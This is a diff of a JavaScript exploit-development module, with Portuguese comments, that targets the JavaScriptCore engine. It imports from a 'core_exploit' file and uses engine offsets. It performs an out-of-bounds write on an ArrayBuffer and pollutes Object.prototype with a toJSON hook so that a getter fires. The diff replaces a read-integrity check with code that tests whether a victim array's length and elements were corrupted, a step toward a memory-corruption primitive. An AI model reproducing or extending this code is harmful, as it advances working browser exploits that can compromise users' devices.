@@ -11,22 +11,23 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForIntegrityTest";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForArrayCorruptionTest";
 let getter_called_flag = false;
-let current_test_results = { success: false, message: "Teste não iniciado.", error: null, data_read: null };
+let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };
 
-const DATA_PATTERN_TO_WRITE_READ = 0x12345678;
-const DATA_OFFSET_FOR_INTEGRITY_TEST = 0x100; // Offset dentro do oob_array_buffer_real (relativo ao início do backing store)
+// Variável para manter a referência ao array vítima
+let victim_arr_ref;
+const ORIGINAL_VICTIM_ARR_ELEMENTS = [ {a:1}, "marker_string_B", 0x12345678, true];
 
-class CheckpointObjectForIntegrityTest {
+class CheckpointObjectForArrayTest {
     constructor(id) {
-        this.id = `IntegrityTestCheckpoint-${id}`;
+        this.id = `ArrayTestCheckpoint-${id}`;
     }
 }
 
-export function toJSON_TriggerIntegrityTestGetter() {
-    const FNAME_toJSON = "toJSON_TriggerIntegrityTestGetter";
-    if (this instanceof CheckpointObjectForIntegrityTest) {
+export function toJSON_TriggerArrayTestGetter() {
+    const FNAME_toJSON = "toJSON_TriggerArrayTestGetter";
+    if (this instanceof CheckpointObjectForArrayTest) {
         logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
         try {
             // eslint-disable-next-line no-unused-vars
@@ -38,20 +39,15 @@ export function toJSON_TriggerIntegrityTestGetter() {
     return this.id;
 }
 
-// A função exportada mantém o nome para compatibilidade
-export async function executeRetypeOOB_AB_Test() {
-    const FNAME_TEST = "executeIntegrityTestInGetter";
-    logS3(`--- Iniciando Teste de Integridade do oob_array_buffer_real no Getter ---`, "test", FNAME_TEST);
+export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
+    const FNAME_TEST = "executeArrayCorruptionTest"; // Nome interno
+    logS3(`--- Iniciando Teste de Corrupção Especulativa de Array ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
-    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, data_read: null };
+    victim_arr_ref = null;
+    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, details: "" };
 
-    // Validações de config...
-    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) {
-        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
-        current_test_results.message = "Offsets críticos não definidos.";
-        return;
-    }
+    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }
 
     let toJSONPollutionApplied = false;
     let getterPollutionApplied = false;
@@ -68,52 +64,93 @@ export async function executeRetypeOOB_AB_Test() {
         }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // 1. Escrever o padrão de dados no offset de teste ANTES de acionar o getter
-        logS3(`Escrevendo padrão de dados ${toHex(DATA_PATTERN_TO_WRITE_READ)} em oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]...`, "info", FNAME_TEST);
-        oob_write_absolute(DATA_OFFSET_FOR_INTEGRITY_TEST, DATA_PATTERN_TO_WRITE_READ, 4); // Escreve 4 bytes
-
-        // 2. Realizar a escrita OOB "gatilho" que aciona o getter
+        // 1. Realizar a escrita OOB "gatilho" (valor conhecido por funcionar)
         const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
-        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor conhecido por acionar o getter
+        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
         oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
         logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);
 
-        // 3. Configurar o getter e poluir
-        const checkpoint_obj = new CheckpointObjectForIntegrityTest(1);
-        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+        // 2. Criar o Array Vítima *APÓS* a escrita OOB gatilho
+        logS3(`Criando array vítima (victim_arr_ref)...`, "info", FNAME_TEST);
+        victim_arr_ref = [...ORIGINAL_VICTIM_ARR_ELEMENTS]; // Cria uma cópia
+        logS3(`victim_arr_ref criado. Length inicial: ${victim_arr_ref.length}, Elemento[1]: ${victim_arr_ref[1]}`, "info", FNAME_TEST);
 
-        Object.defineProperty(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
+        // 3. Configurar o getter e poluir
+        const checkpoint_obj = new CheckpointObjectForArrayTest(1);
+        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForArrayTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
+
+        Object.defineProperty(CheckpointObjectForArrayTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
             get: function() { // Getter SÍNCRONO
                 getter_called_flag = true;
-                const FNAME_GETTER = "IntegrityTest_Getter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando leitura de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]...`, "vuln", FNAME_GETTER);
-                
-                let read_value = null;
-                let read_error = null;
+                const FNAME_GETTER = "ArrayCorruption_Getter";
+                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Inspecionando victim_arr_ref...`, "vuln", FNAME_GETTER);
+                current_test_results = { success: false, message: "Getter chamado, inspecionando victim_arr_ref.", error: null, details: "" };
 
+                if (!victim_arr_ref) {
+                    current_test_results.message = "victim_arr_ref era null no getter!";
+                    logS3("DENTRO DO GETTER: victim_arr_ref é null!", "critical", FNAME_GETTER);
+                    return 0xDEADDEAD;
+                }
+
+                let details_observed = [];
                 try {
-                    if (!oob_array_buffer_real || !oob_read_absolute) { // Verifica oob_read_absolute também
-                        current_test_results.message = "oob_array_buffer_real ou oob_read_absolute era null no getter.";
-                        logS3("DENTRO DO GETTER: oob_array_buffer_real ou oob_read_absolute é null!", "critical", FNAME_GETTER);
-                        return 0xDEADDEAD;
+                    const current_length = victim_arr_ref.length;
+                    details_observed.push(`victim_arr_ref.length atual: ${current_length}`);
+                    logS3(`DENTRO DO GETTER: victim_arr_ref.length atual: ${current_length} (Original: ${ORIGINAL_VICTIM_ARR_ELEMENTS.length})`, "info", FNAME_GETTER);
+
+                    if (current_length !== ORIGINAL_VICTIM_ARR_ELEMENTS.length) {
+                        current_test_results.success = true; // Sucesso se o tamanho mudou
+                        current_test_results.message = `CORRUPÇÃO DE LENGTH! Length: ${current_length}, esperado: ${ORIGINAL_VICTIM_ARR_ELEMENTS.length}`;
+                        logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
                     }
 
-                    logS3(`DENTRO DO GETTER: Tentando ler de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}] usando oob_read_absolute...`, "info", FNAME_GETTER);
-                    read_value = oob_read_absolute(DATA_OFFSET_FOR_INTEGRITY_TEST, 4); // Lê 4 bytes
-                    current_test_results.data_read = toHex(read_value);
+                    // Verificar os elementos
+                    for (let i = 0; i < Math.max(current_length, ORIGINAL_VICTIM_ARR_ELEMENTS.length); i++) {
+                        let current_val_str = "FORA_DOS_LIMITES_ATUAIS";
+                        let original_val_str = i < ORIGINAL_VICTIM_ARR_ELEMENTS.length ? String(ORIGINAL_VICTIM_ARR_ELEMENTS[i]) : "N/A_ORIGINAL";
+                        if (typeof ORIGINAL_VICTIM_ARR_ELEMENTS[i] === 'object') original_val_str = JSON.stringify(ORIGINAL_VICTIM_ARR_ELEMENTS[i]);
 
-                    if (read_value === DATA_PATTERN_TO_WRITE_READ) {
-                        logS3(`DENTRO DO GETTER: SUCESSO! Lido ${toHex(read_value)} corretamente de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]. oob_array_buffer_real está íntegro para R/W.`, "good", FNAME_GETTER);
-                        current_test_results = { success: true, message: `oob_array_buffer_real íntegro. Lido ${toHex(read_value)} corretamente.`, data_read: toHex(read_value), error: null };
-                    } else {
-                        logS3(`DENTRO DO GETTER: FALHA NA INTEGRIDADE! Lido ${toHex(read_value)} de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}], esperado ${toHex(DATA_PATTERN_TO_WRITE_READ)}.`, "error", FNAME_GETTER);
-                        current_test_results = { success: false, message: `Falha na integridade do oob_array_buffer_real. Lido ${toHex(read_value)}, esperado ${toHex(DATA_PATTERN_TO_WRITE_READ)}.`, data_read: toHex(read_value), error: "Mismatch" };
+
+                        if (i < current_length) {
+                            try {
+                                let val = victim_arr_ref[i];
+                                current_val_str = String(val);
+                                if (typeof val === 'object') current_val_str = JSON.stringify(val);
+
+                                if (i < ORIGINAL_VICTIM_ARR_ELEMENTS.length && JSON.stringify(val) !== JSON.stringify(ORIGINAL_VICTIM_ARR_ELEMENTS[i])) {
+                                     details_observed.push(`victim_arr_ref[${i}] alterado: '${current_val_str}' vs original '${original_val_str}'`);
+                                    if (!current_test_results.success) { // Marcar como sucesso se não for apenas o length
+                                        current_test_results.success = true;
+                                        current_test_results.message = `Corrupção de elemento observada em victim_arr_ref[${i}].`;
+                                    }
+                                     logS3(`DENTRO DO GETTER: Corrupção em victim_arr_ref[${i}]: Atual='${current_val_str}', Original='${original_val_str}'`, "vuln", FNAME_GETTER);
+                                } else if (i >= ORIGINAL_VICTIM_ARR_ELEMENTS.length) {
+                                     details_observed.push(`victim_arr_ref[${i}] (extra): '${current_val_str}'`);
+                                     logS3(`DENTRO DO GETTER: Elemento extra victim_arr_ref[${i}]: '${current_val_str}'`, "warn", FNAME_GETTER);
+                                }
+
+                            } catch (e_access) {
+                                current_val_str = `ERRO_AO_ACESSAR: ${e_access.message}`;
+                                details_observed.push(`victim_arr_ref[${i}] ERRO: ${e_access.message}`);
+                                logS3(`DENTRO DO GETTER: Erro ao acessar victim_arr_ref[${i}]: ${e_access.message}`, "error", FNAME_GETTER);
+                                if (!current_test_results.success) current_test_results.success = true; // Erro de acesso também é interessante
+                                current_test_results.message = current_test_results.message + `; Erro acesso victim_arr_ref[${i}]`;
+                            }
+                        }
+                        if (i < 10) { // Logar apenas alguns elementos para não poluir demais
+                             logS3(`DENTRO DO GETTER: victim_arr_ref[${i}]: '${current_val_str}' (Original: '${original_val_str}')`, "info", FNAME_GETTER);
+                        }
                     }
+                    
+                    if (!current_test_results.success && current_test_results.message === "Getter chamado, inspecionando victim_arr_ref.") {
+                        current_test_results.message = "Nenhuma corrupção óbvia (length/elementos) observada em victim_arr_ref.";
+                    }
+                    current_test_results.details = details_observed.join('; ');
 
                 } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO durante oob_read_absolute: ${e.message}`, "error", FNAME_GETTER);
-                    read_error = String(e);
-                    current_test_results = { success: false, message: `Erro ao ler de oob_array_buffer_real no getter: ${e.message}`, data_read: null, error: read_error };
+                    logS3(`DENTRO DO GETTER: ERRO GERAL ao inspecionar victim_arr_ref: ${e.message}`, "error", FNAME_GETTER);
+                    current_test_results.error = String(e);
+                    current_test_results.message = `Erro geral inspecionando victim_arr_ref: ${e.message}`;
                 }
                 return 0xBADF00D;
             },
@@ -122,7 +159,7 @@ export async function executeRetypeOOB_AB_Test() {
         getterPollutionApplied = true;
 
         originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
-        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerIntegrityTestGetter, writable: true, enumerable: false, configurable: true});
+        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerArrayTestGetter, writable: true, enumerable: false, configurable: true});
         toJSONPollutionApplied = true;
         logS3(`Poluições aplicadas.`, "info", FNAME_TEST);
 
@@ -136,25 +173,26 @@ export async function executeRetypeOOB_AB_Test() {
     } catch (mainError) {
         logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
         console.error(mainError);
-        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), data_read: null };
+        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), details: "" };
     } finally {
         // Restauração
         if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
-        if (getterPollutionApplied && CheckpointObjectForIntegrityTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForIntegrityTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
+        if (getterPollutionApplied && CheckpointObjectForArrayTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForArrayTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForArrayTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
         logS3("Limpeza finalizada.", "info", "CleanupFinal");
     }
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE INTEGRIDADE: ${current_test_results.message}`, "good", FNAME_TEST);
+            logS3(`RESULTADO TESTE ARRAY CORRUPTION: ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO TESTE INTEGRIDADE: Getter chamado, mas falha/erro. ${current_test_results.message}`, "error", FNAME_TEST);
+            logS3(`RESULTADO TESTE ARRAY CORRUPTION: Getter chamado, mas sem corrupção óbvia. ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "warn", FNAME_TEST);
         }
     } else {
-        logS3("RESULTADO TESTE INTEGRIDADE: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        logS3("RESULTADO TESTE ARRAY CORRUPTION: Getter NÃO foi chamado.", "error", FNAME_TEST);
     }
-    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
+    logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
-    logS3(`--- Teste de Integridade do oob_array_buffer_real Concluído ---`, "test", FNAME_TEST);
+    victim_arr_ref = null; 
+    logS3(`--- Teste de Corrupção Especulativa de Array Concluído ---`, "test", FNAME_TEST);
 }
